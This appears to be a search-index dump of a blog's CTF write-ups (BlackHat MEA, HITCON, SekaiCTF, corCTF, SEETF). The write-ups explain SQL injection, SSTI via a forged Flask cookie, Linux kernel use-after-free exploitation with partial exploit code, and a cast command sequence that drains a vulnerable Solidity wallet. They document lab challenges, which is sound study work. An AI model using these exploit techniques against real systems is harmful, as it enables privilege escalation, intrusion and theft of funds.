2023","uri":"/posts/blackhat-mea-ctf-2023/"},{"categories":null,"content":"Solution In this blackbox challenge, we were presented with a website featuring a login page. They also provides us with a working credential: user:password. While testing the website, we identified that the parameter was susceptible to SQL injection. For instance, entering the parameters (SELECT \"username\")=user\u0026(SELECT \"password\")=password on the login form resulted in a successful login. Exploiting this SQL injection vulnerability, we discovered another account from user. Trying to leak it, we found the credentials of this new account: admin:ILIKEpotatoesSOMUCH::\u0026\u0026. Further exploration led us to the revelation that the admin password also used as the flask secret key. This significant find meant that we had the ability to construct a valid Flask session cookie. An interesting observation was made upon decoding this cookie: the decoded value was {\"type\": \"user\"}. Intriguingly, this type attribute was prominently displayed on the /panel page for both admin and user accounts (Notes that the admin account cokie type is also user). Our suspicion led us to believe that a Server-Side Template Injection (SSTI) vulnerability might be lurking here. To confirm our hypothesis, we created a cookie where the type value is set to {{7*'7'}}. As expected, we can trigger the SSTI. The path ahead was clear: craft a cookie with the type attribute set to a valid SSTI payload. Exploiting RCE via SSTI, we could read the flag stored in the / directory. Social Media Follow me on twitter ","date":"Oct 10, 2023","objectID":"/posts/blackhat-mea-ctf-2023/:4:1","tags":["Writeup","BlackHat","2023","pwn","crypto","binary search","linker","ssti","sqli"],"title":"BlackHat MEA CTF 2023","uri":"/posts/blackhat-mea-ctf-2023/"},{"categories":null,"content":" HITCON CTF 2023 Last week, I spent my weekend working on the HITCON CTF challenge named “Full Chain - Wall Rose”. I was part of the Blue Water team, and we managed to get the first place in the qualifiers, earning a spot in the finals. We got first place in the qualifiers Below is the writeup of one of the pwn challenges called “Full Chain - Wall Rose”. Pwn Full Chain - Wall Rose Description Challenge: You have a busybox shell running as user user /home/user/rose.ko is a vulnerable kernel driver Try exploiting /home/user/rose.ko to achieve privilege escalation You may assumed that Busybox, the Linux kernel, and Qemu are not vulnerable. Notes: FG-KASLR is enabled Your exploit should be kernel-agnostic. In other words, it should not rely on any kernel offsets Author: wxrdnx ","date":"Sep 13, 2023","objectID":"/posts/hitcon-ctf-2023/:0:0","tags":["Writeup","HITCON","pwn","kernel","cross-cache","DirtyCred","2023"],"title":"HITCON CTF 2023","uri":"/posts/hitcon-ctf-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were provided with the source code of a vulnerable kernel driver named rose.c to analyze. Here’s the source code: #include \u003clinux/atomic.h\u003e #include \u003clinux/device.h\u003e #include \u003clinux/fs.h\u003e #include \u003clinux/init.h\u003e #include \u003clinux/kernel.h\u003e #include \u003clinux/miscdevice.h\u003e #include \u003clinux/module.h\u003e #include \u003clinux/slab.h\u003e #include \u003clinux/uaccess.h\u003e #include \u003casm/errno.h\u003e #include \u003clinux/printk.h\u003e #define MAX_DATA_HEIGHT 0x400 MODULE_AUTHOR(\"wxrdnx\"); MODULE_LICENSE(\"GPL\"); MODULE_DESCRIPTION(\"Wall Rose\"); static char *data; static int rose_open(struct inode *inode, struct file *file) { data = kmalloc(MAX_DATA_HEIGHT, GFP_KERNEL); if (!data) { printk(KERN_ERR \"Wall Rose: kmalloc error\\n\"); return -1; } memset(data, 0, MAX_DATA_HEIGHT); return 0; } static int rose_release(struct inode *inode, struct file *file) { kfree(data); return 0; } static ssize_t rose_read(struct file *filp, char __user *buffer, size_t length, loff_t *offset) { pr_info(\"Wall Rose: data dropped\"); return 0; } static ssize_t rose_write(struct file *filp, const char __user *buffer, size_t length, loff_t *offset) { pr_info(\"Wall Rose: data dropped\"); return 0; } static struct file_operations rose_fops = { .owner = THIS_MODULE, .open = rose_open, .release = rose_release, .read = rose_read, .write = rose_write, }; static struct miscdevice rose_device = { .minor = MISC_DYNAMIC_MINOR, .name = \"rose\", .fops = \u0026rose_fops, }; static int __init rose_init(void) { return misc_register(\u0026rose_device); } static void __exit rose_exit(void) { misc_deregister(\u0026rose_device); } module_init(rose_init); module_exit(rose_exit); We discovered that our interactions with the driver were limited to open and close operations. The bug we identified was rather straightforward. If we opened a multiple of file descriptors to the driver, they all shared the same data chunk. This allowed us to execute multiple kfree operations on the stored data by closing the previously opened file descriptors, indicating a Use-After-Free (UAF) condition. However, we were unable to perform read and write operations. Given this constraint, our next step was to craft a strategy for successful exploitation. ","date":"Sep 13, 2023","objectID":"/posts/hitcon-ctf-2023/:1:0","tags":["Writeup","HITCON","pwn","kernel","cross-cache","DirtyCred","2023"],"title":"HITCON CTF 2023","uri":"/posts/hitcon-ctf-2023/"},{"categories":null,"content":"Solution I worked on this challenge alongside two of my teammates, sampriti and cru5h. This challenge forms a part of the full chain challenge. The challenge notes encouraged us to develop an exploit that was kernel-agnostic, taking into consideration the presence of FG-KASLR as well. Thus, we set out to devise an exploit stable enough for future use. Given the UAF scenario, we opted to explore cross-cache exploitation, which seemed promising since we would not require a leak later on, and it promised to be kernel-agnostic as well. The bug identified was a UAF in kmalloc-1k. We resolved to pursue cross-cache exploitation, allowing the chunk to be utilized by other objects of varying sizes. We targeted the file structure, planning to later trigger the DirtyCred technique. Analyzing last year’s writeup along with the CVE-2022-29582 writeup greatly enhanced my grasp of the exploitation techniques involved. These resources, particularly new to me, offered clear guidance on navigating the page allocator and included a practical abstraction for initiating cross-cache exploitation. I would strongly recommend reviewing these write-ups to gain a deeper comprehension of it. To offer some background, the Linux kernel features a slab allocator named SLUB that manages the caches of kernel heap objects. Each slab is designated to manage objects of a uniform size. During slab allocation, the kernel utilizes pages. The necessity to trigger a cross-cache arises due to the specific attributes of the file object: It has a size of 256. It is housed in a dedicated cache named filp. The UAF vulnerability that we had were located in kmalloc-1k, and the file struct has its own dedicated cache. Therefore, even if we have a UAF vulnerability with the same size as the file struct, we still need to initiate a cross-cache attack, since rose objects are allocated in the general cache. Now that we have this knowledge, as outlined in the aforementioned writeup, the initial step is to discard a slab that houses our rose object. The procedure to accomplish this is clearly explained in Ruia’s writeup. The first task is to determine the values of OBJS_PER_SLAB and CPU_PARTIAL for kmalloc-1k. To verify these values, we can execute the following commands: cat /sys/kernel/slab/kmalloc-1k/objs_per_slab cat /sys/kernel/slab/kmalloc-1k/cpu_partial Now, let’s start crafting the exploit. We adapted the abstraction provided in last year’s writeup to trigger the cross-cache. //gcc -pthread -no-pie -static ../../exploit.c -o exp #define _GNU_SOURCE #include \u003cassert.h\u003e #include \u003cfcntl.h\u003e #include \u003cerrno.h\u003e #include \u003cinttypes.h\u003e #include \u003climits.h\u003e #include \u003cpthread.h\u003e #include \u003csignal.h\u003e #include \u003cstdbool.h\u003e #include \u003cstddef.h\u003e #include \u003cstdint.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cpoll.h\u003e #include \u003cstdnoreturn.h\u003e #include \u003cstring.h\u003e #include \u003cunistd.h\u003e #include \u003clinux/userfaultfd.h\u003e #include \u003csys/ioctl.h\u003e #include \u003csys/ipc.h\u003e #include \u003csys/mman.h\u003e #include \u003csys/msg.h\u003e #include \u003csys/stat.h\u003e #include \u003csys/syscall.h\u003e #include \u003csys/timerfd.h\u003e #include \u003csys/wait.h\u003e #include \u003csys/types.h\u003e #include \u003csys/resource.h\u003e #include \u003clinux/capability.h\u003e #include \u003csys/xattr.h\u003e #include \u003clinux/io_uring.h\u003e #include \u003clinux/membarrier.h\u003e #include \u003clinux/io_uring.h\u003e #include \u003clinux/membarrier.h\u003e #define logd(fmt, ...) fprintf(stderr, (fmt), ##__VA_ARGS__) #define CC_OVERFLOW_FACTOR 5 // Used to handle fragmentation #define OBJS_PER_SLAB 8 // Fetch this from /sys/kernel/slab/kmalloc-1k/objs_per_slab #define CPU_PARTIAL 24 // Fetch this from /sys/kernel/slab/kmalloc-1k/cpu_partial #define MSG_SIZE 0x400-48 // kmalloc-1k (because CONFIG_MEMCG_KMEM is disabled, we can use msg_msg) static noreturn void fatal(const char *msg) { perror(msg); exit(EXIT_FAILURE); } /* Cross-cache abstraction taken from https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel Notes that here is minor adjustments that we made to the abstraction */ enum { CC_RESERVE_PARTIAL_LIST = 0, CC_ALLOC_VICTIM_PAGE, CC_FIL","date":"Sep 13, 2023","objectID":"/posts/hitcon-ctf-2023/:2:0","tags":["Writeup","HITCON","pwn","kernel","cross-cache","DirtyCred","2023"],"title":"HITCON CTF 2023","uri":"/posts/hitcon-ctf-2023/"},{"categories":null,"content":" SekaiCTF 2023 Last weekend, I was spending some of my free time to participate in SekaiCTF 2023 with goals trying to get some bounty from solving the blockchain challenges. I had two attempts for two blockchain challenges called Play For Free and Re-Remix. Fortunately, I can get the second blood for the Play For Free challenge, but failed to get blood for the Re-Remix challenge. This is my writeup for the Play For Free challenge in the SekaiCTF 2023 (I didn’t try The Bidding challenge because when I finished the Play For Free challenge, the bounty has been claimed by the others). Blockchain ","date":"Aug 27, 2023","objectID":"/posts/sekaictf-2023/:0:0","tags":["Writeup","SekaiCTF","blockchain","evm","solana","solang","2023"],"title":"SekaiCTF 2023","uri":"/posts/sekaictf-2023/"},{"categories":null,"content":"Play For Free Description Tokens are consistently left around the arcade by generous individuals. We can gather these tokens and play 1pc for free! Author: Y4nhu1 ","date":"Aug 27, 2023","objectID":"/posts/sekaictf-2023/:1:0","tags":["Writeup","SekaiCTF","blockchain","evm","solana","solang","2023"],"title":"SekaiCTF 2023","uri":"/posts/sekaictf-2023/"},{"categories":null,"content":"Initial Analysis For this challenge, we were given a zip file called dist.zip. After I try to unzip it, turns out the setup is quite similar to the usual solana ctf challenge. As usual, let’s start by inspecting the server/src/main.rs first, so that we know what is our goal in this challenge. use solana_sdk::{ signature::{Keypair, Signer}, pubkey::Pubkey, instruction::{Instruction, AccountMeta}, }; use solana_program_test::tokio; use solana_program::{system_program, system_instruction}; use sol_ctf_framework::ChallengeBuilder; use rand::{ rngs::StdRng, SeedableRng, Rng, distributions::{Alphanumeric, DistString}, }; use borsh::ser::BorshSerialize; use std::{ fs, io::Write, error::Error, str::FromStr, net::{TcpListener, TcpStream}, }; #[tokio::main] async fn main() -\u003e Result\u003c(), Box\u003cdyn Error\u003e\u003e { let listener = TcpListener::bind(\"0.0.0.0:8080\")?; println!(\"Listening on port 8080 ...\"); for stream in listener.incoming() { let stream = stream.unwrap(); tokio::spawn(async move { if let Err(err) = handle_connection(stream).await { println!(\"error: {:?}\", err); } }); } Ok(()) } async fn handle_connection(mut socket: TcpStream) -\u003e Result\u003c(), Box\u003cdyn Error\u003e\u003e { let mut builder = ChallengeBuilder::try_from(socket.try_clone().unwrap()).unwrap(); // load programs let pub_str = \"ArciEpQvGwZk5yegHEiy27afRZaDLKU8B3kj5MWc38rq\"; let program_id = builder.add_program(\"Arcade.so\", Some(Pubkey::from_str(\u0026pub_str)?)); let solve_id = builder.input_program().unwrap(); let mut chall = builder.build().await; let payer_keypair = \u0026chall.ctx.payer; let payer = payer_keypair.pubkey(); // create user let user = Keypair::new(); // fund user chall.run_ix(system_instruction::transfer( \u0026payer, \u0026user.pubkey(), 1_000_000_000, // 1 SOL )).await?; // create data account let data_account = Keypair::new(); let mut constructor_data = vec![0x87, 0x2c, 0xcd, 0xc6, 0x19, 0x01, 0x48, 0xbc]; // discriminator let mut rng = StdRng::from_entropy(); constructor_data.extend_from_slice(\u0026rng.gen::\u003cu64\u003e().to_be_bytes()); constructor_data.extend_from_slice(\u0026rng.gen::\u003cu64\u003e().to_be_bytes()); constructor_data.extend_from_slice(\u0026rng.gen::\u003cu64\u003e().to_be_bytes()); let random_address = Keypair::new().pubkey(); constructor_data.extend_from_slice(\u0026random_address.to_bytes()); let random_string = Alphanumeric.sample_string(\u0026mut rng, 8); constructor_data.extend_from_slice(\u0026BorshSerialize::try_to_vec(\u0026random_string)?); // initialize chall.run_ixs_full( \u0026[Instruction::new_with_bytes( program_id, \u0026constructor_data, vec![ AccountMeta::new(data_account.pubkey(), true), AccountMeta::new(user.pubkey(), true), AccountMeta::new_readonly(system_program::id(), false), ], )], \u0026[\u0026data_account, \u0026user], \u0026user.pubkey(), ).await?; // create data account for user program let user_data = Keypair::new(); writeln!(socket, \"program: {}\", program_id)?; writeln!(socket, \"data account: {}\", data_account.pubkey())?; writeln!(socket, \"user: {}\", user.pubkey())?; writeln!(socket, \"user data: {}\", user_data.pubkey())?; // run solve let solve_ix = chall.read_instruction(solve_id)?; chall.run_ixs_full( \u0026[solve_ix], \u0026[\u0026user_data, \u0026user], \u0026user.pubkey(), ).await?; // check solve let account_data = chall.ctx.banks_client.get_account(data_account.pubkey()).await?.unwrap().data; let play_count = u32::from_le_bytes(account_data[20..24].try_into().unwrap()); if play_count \u003e 0 { let flag = fs::read_to_string(\"flag.txt\").unwrap(); writeln!(socket, \"Oops, new registered players can also play 1pc for free \u003e \u003c\")?; writeln!(socket, \"{}\", flag)?; } else { writeln!(socket, \"You haven't played yet :\u003c\")?; } Ok(()) } Looking at some of the LOCs located near the end of the file, we can see that the goal is to make the play_count from the challenge contract become larger than 0. So now, let’s move to the challenge contract. I was surprised because the challenge was written in solidity. Looking through the given program/Makefile, turns out that the contract (Arcade.sol) was written in solang. Googling a little bit about it, solang is a Solidity c","date":"Aug 27, 2023","objectID":"/posts/sekaictf-2023/:1:1","tags":["Writeup","SekaiCTF","blockchain","evm","solana","solang","2023"],"title":"SekaiCTF 2023","uri":"/posts/sekaictf-2023/"},{"categories":null,"content":"Solution In blockchain, nothing is private. In EVM, we can still fetch private variable values by directly scanning the storage of the contract. However, this challenge was written in solang, and I don’t know much about how solang works. So, I decided to read the documentation first on how it works, so that I can understand better on solang and gain comprehension on how to fetch the data. First, I setup solang in my local by: Install the solang compiler from this link. Install solang extension in vscode. After that, I tried to read the documentation and the guide to get better understanding how it works. Luckily, the guide was good enough for beginner. The guide also mentioned the difference between EVM and Solana (Solang) regarding how it stored state data. It stated that Solana will create a new account called data account which is used to store the state data \u0026 owned by the program. After knowing this important information, I started to dig more in the documentation, and found a page called builtins which consists of available builtins in Solang. Reading through it one-by-one, I observed an interesting array called tx.accounts. Checking through its array type (AccountInfo) documentation, we can see that it has a lot of useful properties such as: address (key) data owner is_writable etc After reading this, I was thinking that maybe we need to check this tx.accounts content, and then try to check the data value. So, I started to learn how to code in Solang based on reading through the documentation and following the arcade sol. It’s pretty much the same with Solidity, but there are some different syntax for it. For example: We need to specify program_id in the top of our defined contract Specifying address is in form of address'\u003caddress\u003e' etc. To kickstart it, start by running solang new --target solana solve. This will generate a new folder called solve with placeholder .sol file and the toml file. I rename it to solve.sol, and update the toml file to be: [package] input_files = [\"solve.sol\"] contracts = [\"Solve\"] [target] name = \"solana\" To compile the file, we can use solang compile, and it will generate a .so file that we can send to the server. Now, we can start code our solver. First, I start by defining the arcade interface, so that I can interact with it inside my solver program. One thing to observe is that the Arcade has many functions with same name (find) but with different parameters. At first, I thought that I can just use it in my defined interface for the Arcade. But it doesn’t work, and then I realized that there is the comment on each function in the given Arcade.sol which is the correct name that we can use for the interface (e.g. find_bytes32). Below is the interface that I use: interface arcadeInterface { function find_string_uint64(string calldata machine, uint64 location) external; function find_bytes32(address location) external; function find_string(string location) external; function play() external; } To debug it, I didn’t use the given docker. I just directly run the given arcade-server and then use the given solve.py as my baseline for my script to interact with the server. Next step is we need to define our contract, and try to debug what is tx.accounts and can we retrieve any data from there. After doing trial and error, I observed that the tx.accounts are actually the account_metas array that we pass in the solve.py script. And observed that there is indeed data account on there. Realizing this, the target here is to access the passed data account’s data inside our solver program. However, at first, I have difficulty running the solver script because somehow it always return error. After debug it for a while, I observed some things that I need to adjust in the baseline script to make it worked: The order in account_metas are important. I need to re-arrange it Because I have no experience in solana challenge, I basically just try to fill the account_metas slowly until it works. Every time I got ","date":"Aug 27, 2023","objectID":"/posts/sekaictf-2023/:1:2","tags":["Writeup","SekaiCTF","blockchain","evm","solana","solang","2023"],"title":"SekaiCTF 2023","uri":"/posts/sekaictf-2023/"},{"categories":null,"content":" corCTF 2023 Last weekend, I played with the Water Paddler team in the corCTF 2023. We managed to secure the first place. A huge shoutout and thanks to my awesome teammates for their fantastic teamwork during the corCTF 2023! We secured the first place Below is the writeup for the kernel pwn challenge called kcipher and blockchain challenge called baby-wallet. Pwn ","date":"Jun 12, 2023","objectID":"/posts/corctf-2023/:0:0","tags":["Writeup","corCTF","pwn","kernel","uaf","2023"],"title":"corCTF 2023","uri":"/posts/corctf-2023/"},{"categories":null,"content":"kcipher Description lightning fast super-secure and cryptographically safe(?) ciphering in kernel space connect with ssh: ssh kcipher@i.be.ax upload a file to /tmp/exploit: ssh -t kcipher@i.be.ax connect $(cat exploit | ssh i.be.ax upload) ","date":"Jun 12, 2023","objectID":"/posts/corctf-2023/:1:0","tags":["Writeup","corCTF","pwn","kernel","uaf","2023"],"title":"corCTF 2023","uri":"/posts/corctf-2023/"},{"categories":null,"content":"Initial Analysis After unpacking the provided initramfs.cpio.gz, we noticed a driver named kcipher.ko. Let’s attempt to disassemble it first. Below are some notable functions. device_ioctl __int64 __fastcall device_ioctl(__int64 a1, int a2, __int64 buf) { __int64 v4; // rax char *v5; // rbx int v6; // r13d __int64 v7; // rsi __int64 v8; // r12 __int64 v9; // rax if ( a2 != 0xEDBEEF00 ) return -22LL; v4 = kmalloc_trace(kmalloc_caches[1], 0x400DC0LL, 0x60LL); v5 = (char *)v4; if ( !v4 ) return -12LL; *(_DWORD *)(v4 + 0x18) = 0; v6 = anon_inode_getfd(\"kcipher-buf\", \u0026kcipher_cipher_fops, v4, 2LL); if ( v6 \u003e= 0 ) { v7 = buf; v8 = copy_from_user(v5, buf, 8LL); if ( !v8 ) { v9 = *(unsigned int *)v5; if ( (unsigned int)v9 \u003c= 3 ) { strncpy(v5 + 0x1C, (const char *)*(\u0026ciphers + v9), 0x40uLL); return v6; } v8 = -22LL; } kfree(v5, v7); return v8; } kfree(v5, \u0026kcipher_cipher_fops); return v6; } The above function is the ioctl handler. When we call ioctl on the driver, it will: Allocate a new chunk. Open a new file descriptor called kcipher-buf, which has its own fops. The newly allocated chunk will be used as the private data of the new file descriptor. Copy 8 bytes from the given userspace address (the ioctl third param). We will learn later that these 8 bytes are actually: The first 4 bytes represent the cipher_mode. The final 4 bytes represent the cipher_key. Initially, we didn’t see any bugs in this section. However, it turns out there is a bug, which will be explained later. cipher_write __int64 __fastcall cipher_write(__int64 a1, __int64 buf, uint64_t size) { cipher_struct *v3; // r15 __int64 v5; // rax char *v6; // rdi __int64 v7; // r13 __int64 text_chunk; // rax __int64 v9; // rbx v3 = *(cipher_struct **)(a1 + 0xC0); if ( size \u003e 0x1000 ) return -12LL; v5 = raw_spin_lock_irqsave(\u0026v3-\u003espinlock); v6 = v3-\u003etext; v7 = v5; if ( v6 ) { kfree(v6, buf); v3-\u003etext = 0LL; } text_chunk = _kmalloc(size, 0xCC0LL); v3-\u003etext = (char *)text_chunk; if ( !text_chunk ) { raw_spin_unlock_irqrestore(\u0026v3-\u003espinlock, v7); return -12LL; } v3-\u003esize = size; v9 = strncpy_from_user(text_chunk, buf, size); raw_spin_unlock_irqrestore(\u0026v3-\u003espinlock, v7); return v9; } This is the write handler of the kcipher-buf device. For context, we have created a helper struct called cipher_struct. This struct is the expected format of the private_data that was previously allocated during the initialization of the file via device_ioctl. The rough struct looks like this: struct cipher_struct { uint cipher_mode; uint cipher_key; uint64_t size; char *text; void *spinlock; }; This function will: Allocate a new chunk with kmalloc with our input size. Put the chunk address to the file cipher_struct-\u003etext. Put the input size as cipher_stuct-\u003esize. Copy the string that we send from userspace address to the text chunk with strncpy. This means that our copied string won’t be allowed to have null bytes because the strncpy will stop on it. cipher_read __int64 __fastcall cipher_read(__int64 a1, __int64 buf, uint64_t size) { cipher_struct *v3; // r15 __int64 v5; // rax __int64 v6; // r12 __int64 v7; // rbx v3 = *(cipher_struct **)(a1 + 0xC0); v5 = raw_spin_lock_irqsave(\u0026v3-\u003espinlock); v6 = v5; if ( v3-\u003etext ) { do_encode((__int64)v3); if ( size \u003e v3-\u003esize ) size = v3-\u003esize; if ( size \u003e 0x7FFFFFFF ) BUG(); v7 = size - copy_to_user(buf, v3-\u003etext, size); raw_spin_unlock_irqrestore(\u0026v3-\u003espinlock, v6); } else { v7 = -2LL; raw_spin_unlock_irqrestore(\u0026v3-\u003espinlock, v5); } return v7; } This is the read handler of the kcipher-buf device. Essentially, this function will encrypt the cipher_struct-\u003etext before returning it to us. The do_encode function is quite straightforward. It will encrypt the text using an encryption scheme based on cipher_struct-\u003ecipher_mode. For example, mode 0 is a rot cipher, which increases our text by the given cipher_key. Mode 1 is a xor cipher, which xors our text with the given cipher_key. Based on the above disassembly, we can identify a bug that allows us to trigger a le","date":"Jun 12, 2023","objectID":"/posts/corctf-2023/:1:1","tags":["Writeup","corCTF","pwn","kernel","uaf","2023"],"title":"corCTF 2023","uri":"/posts/corctf-2023/"},{"categories":null,"content":"Solution Now that we’ve identified the bugs, let’s proceed to the exploitation. Our first step is to obtain a leak of a kernel address, and we can use the first bug to do this. We first spray the seq_operations object (which has a size of 0x20). The seq_operations struct contains a pointer to the kernel address. Therefore, if we somehow free this chunk and then it gets reused by cipher_write when allocating text, we can easily get the leak by exploiting the first bug. Here are the sequences: Spray seq_operations and free them. Open /dev/kcipher and call device_ioctl to initialize a new kcipher-buf file (we’ll call this k1). Set the cipher_mode to rot so that we can easily decrypt it. Call cipher_write with size 0x20 and an empty string. It will reuse the freed seq_operations chunk, which contains a kernel address. Hence, cipher_struct-\u003etext will contain a kernel address. Call cipher_read, and we’ll get the encrypted text. Decrypt it, and we’ll get a leak. Now that we have the leak, it’s time to exploit the second bug. Based on the disassembly, the private_data chunk size is 0x60. Our idea is to create a 0x60 chunk with cipher_write, so that we have an overlapping chunk between text and private_data. Here’s a short summary (detailed explanations can be found in the script comment): After obtaining the leak, open a new kcipher-buf via device_ioctl (we’ll call this k2). However, this time, set an invalid cipher_mode, so that k2-\u003eprivate_data will be freed by the code. Now, with k1, create a new text chunk with size 0x60. This chunk (k1-\u003eprivate_data-\u003etext) will overlap with k2-\u003eprivate_data. Now that we have overlapping chunks, the goal is to carefully craft k2-\u003eprivate_data so that we can execute arbitrary writes via the cipher_read of the k2 file. We also have arbitrary write because we will be able to set the private_data-\u003etext stored pointer to any address that we want. However, due to strncpy, we can’t easily craft k2-\u003eprivate_data via k1-\u003eprivate_data-\u003etext, as there are a lot of null bytes that we need to craft a valid private_data. My teammate (sampriti) suggested that we can easily bypass this by encrypting our payload. So, when we decrypt it with cipher_read, the payload will be converted back to the original value (which is our fake private_data). For example: Let’s say we set the cipher_mode to rot and the cipher_key to 0x30. Then, if we want to have a payload, let’s say 0x0040, we can set our payload to 0xd010. So, when we encrypt it, the payload will be reverted back to 0x0040. After successfully crafting k2-\u003eprivate_data, we can simply set modprobe_path as k2-\u003eprivate_data-\u003etext, then attempt to overwrite it byte by byte with cipher_read. Below is the full script with detailed explanation. #define _GNU_SOURCE #include \u003cfcntl.h\u003e #include \u003cstdint.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003cinttypes.h\u003e #include \u003csys/ioctl.h\u003e #include \u003csys/msg.h\u003e #include \u003csys/shm.h\u003e #include \u003csys/stat.h\u003e #include \u003csys/syscall.h\u003e #include \u003csys/socket.h\u003e #include \u003csys/types.h\u003e #include \u003clinux/userfaultfd.h\u003e #include \u003csys/resource.h\u003e #include \u003cpthread.h\u003e #include \u003csys/mman.h\u003e #include \u003cpoll.h\u003e #include \u003ctime.h\u003e #include \u003cunistd.h\u003e #define modprobe_path kbase + 0x8a83a0 unsigned long kbase; void fatal(const char *msg) { perror(msg); exit(1); } // Helper method during debugging void print_data(char *buf, size_t len) { // Try to print data for (int i = 0; i \u003c len; i += 8) { char* fmt_str; if ((i / 8) % 2 == 0) { fmt_str = \"0x%04x: 0x%016lx\"; printf(fmt_str, i, *(unsigned long*)\u0026buf[i]); } else { fmt_str = \" 0x%016lx\\n\"; printf(fmt_str, *(unsigned long*)\u0026buf[i]); } } puts(\"\"); } void decrypt_helper(char *enc, size_t len, uint key) { for (int i = 0; i \u003c len; i++) { enc[i] -= key; } } int main() { /* Based on observation in gdb, the inode file priv structure is like this: typedef struct { uint cipher_mode; uint cipher_key; int64_t size; char* text; void* spinlock; } cipher_struct; */ int fd = open(\"/dev/kcipher\", O_","date":"Jun 12, 2023","objectID":"/posts/corctf-2023/:1:2","tags":["Writeup","corCTF","pwn","kernel","uaf","2023"],"title":"corCTF 2023","uri":"/posts/corctf-2023/"},{"categories":null,"content":"baby-wallet Description I wrote my first Solidity smart contract! nc be.ax 30444 ","date":"Jun 12, 2023","objectID":"/posts/corctf-2023/:2:0","tags":["Writeup","corCTF","pwn","kernel","uaf","2023"],"title":"corCTF 2023","uri":"/posts/corctf-2023/"},{"categories":null,"content":"Initial Analysis We were given two smart contracts called Setup.sol and BabyWallet.sol. Setup.sol pragma solidity ^0.8.17; import \"./BabyWallet.sol\"; contract Setup { BabyWallet public wallet; constructor() payable { require(msg.value == 100 ether, \"requires 100 ether\"); wallet = new BabyWallet(); payable(address(wallet)).transfer(msg.value); } function isSolved() public view returns (bool) { return address(wallet).balance == 0 ether; } } Based on the source code, the initial setup for the challenge is that the wallet will be filled with 100 ether. Our goal for this challenge is to drain the wallet balance to 0. BabyWallet.sol pragma solidity ^0.8.17; contract BabyWallet { mapping(address =\u003e uint256) public balances; mapping(address =\u003e mapping(address =\u003e uint256)) public allowances; function deposit() public payable { balances[msg.sender] += msg.value; } function withdraw(uint256 amt) public { require(balances[msg.sender] \u003e= amt, \"You can't withdraw that much\"); balances[msg.sender] -= amt; (bool success, ) = msg.sender.call{value: amt}(\"\"); require(success, \"Failed to withdraw that amount\"); } function approve(address recipient, uint256 amt) public { allowances[msg.sender][recipient] += amt; } function transfer(address recipient, uint256 amt) public { require(balances[msg.sender] \u003e= amt, \"You can't transfer that much\"); balances[msg.sender] -= amt; balances[recipient] += amt; } function transferFrom(address from, address to, uint256 amt) public { uint256 allowedAmt = allowances[from][msg.sender]; uint256 fromBalance = balances[from]; uint256 toBalance = balances[to]; require(fromBalance \u003e= amt, \"You can't transfer that much\"); require(allowedAmt \u003e= amt, \"You don't have approval for that amount\"); balances[from] = fromBalance - amt; balances[to] = toBalance + amt; allowances[from][msg.sender] = allowedAmt - amt; } fallback() external payable {} receive() external payable {} } Looking through the above wallet source code, we observed that there’s a bug in the transferFrom method. If we transfer to our own address (which is allowed), our balance will increase by the amount that we pass to the method. This is because, when calculating balances[to], it uses the initial balance instead of the updated balance. Now that we’re aware of the bug, we can start crafting our attack. ","date":"Jun 12, 2023","objectID":"/posts/corctf-2023/:2:1","tags":["Writeup","corCTF","pwn","kernel","uaf","2023"],"title":"corCTF 2023","uri":"/posts/corctf-2023/"},{"categories":null,"content":"Solution Based on the bug we discovered earlier, we need to perform the following sequence to drain the wallet’s ethers: Deposit 100 ether. Approve 100 ether for our own address. Transfer 100 ether to our own address using transferFrom. Due to the bug, our final balance will be 200 ether. Withdraw 200 ether. At this point, the wallet is drained. We can use cast command-line (installed by foundry) to perform the above steps. # Fetch wallet address cast call 0x13b066B5200dc2B501DBdf32905114F4B65daBa5 \"wallet()\" -r https://baby-wallet.be.ax/03006321-ee43-49f2-99ed-1f41ddf51fbe --private-key 0x3ac5e63ad1e3856885bd6c7bbd1d824c61e2933c0a924fd649fcaefb7fd7dfb6 # Deposit 100 ether cast send 0x92dcb819da0a04d699479a7385d727aa93950bed \"deposit()\" -r https://baby-wallet.be.ax/03006321-ee43-49f2-99ed-1f41ddf51fbe --private-key 0x3ac5e63ad1e3856885bd6c7bbd1d824c61e2933c0a924fd649fcaefb7fd7dfb6 --value 100ether # Approve self address 100 ether cast send 0x92dcb819da0a04d699479a7385d727aa93950bed \"approve(address,uint256)\" -r https://baby-wallet.be.ax/03006321-ee43-49f2-99ed-1f41ddf51fbe --private-key 0x3ac5e63ad1e3856885bd6c7bbd1d824c61e2933c0a924fd649fcaefb7fd7dfb6 -- 0xCE505e01b09F0E83EDEB7D1d9FD27AB218A85CF5 100e ther # Transfer to self address 100 ether cast send 0x92dcb819da0a04d699479a7385d727aa93950bed \"transferFrom(address,address,uint256)\" -r https://baby-wallet.be.ax/03006321-ee43-49f2-99ed-1f41ddf51fbe --private-key 0x3ac5e63ad1e3856885bd6c7bbd1d824c61e2933c0a924fd649fcaefb7fd7dfb6 -- 0xCE505e01b09F0E83EDEB7D1d9FD27AB218A85CF5 0xCE505e01b09F0E83EDEB7D1d9FD27AB218A85CF5 100ether # Withdraw cast send 0x92dcb819da0a04d699479a7385d727aa93950bed \"withdraw(uint256)\" -r https://baby-wallet.be.ax/03006321-ee43-49f2-99ed-1f41ddf51fbe --private-key 0x3ac5e63ad1e3856885bd6c7bbd1d824c61e2933c0a924fd649fcaefb7fd7dfb6 -- 200ether Flag: corctf{inf1nite_m0ney_glitch!!!} Social Media Follow me on twitter ","date":"Jun 12, 2023","objectID":"/posts/corctf-2023/:2:2","tags":["Writeup","corCTF","pwn","kernel","uaf","2023"],"title":"corCTF 2023","uri":"/posts/corctf-2023/"},{"categories":null,"content":" SEETF 2023 Lately, I’ve been diving into learning smart contracts, and I stumbled upon the SEETF 2023 challenges this weekend. It turns out there are four cool challenges specifically focused on smart contracts. Despite having a hectic weekend, I decided to carve out some time to give them a shot. Fortunately, I managed to solve all of it. Here is my writeup for the challenges. Smart Contracts ","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:0:0","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Murky Description The SEE team has a list of special NFTs that are only allowed to be minted. Find out which one its allowed! nc win.the.seetf.sg 8546 ","date":"Jun 12, 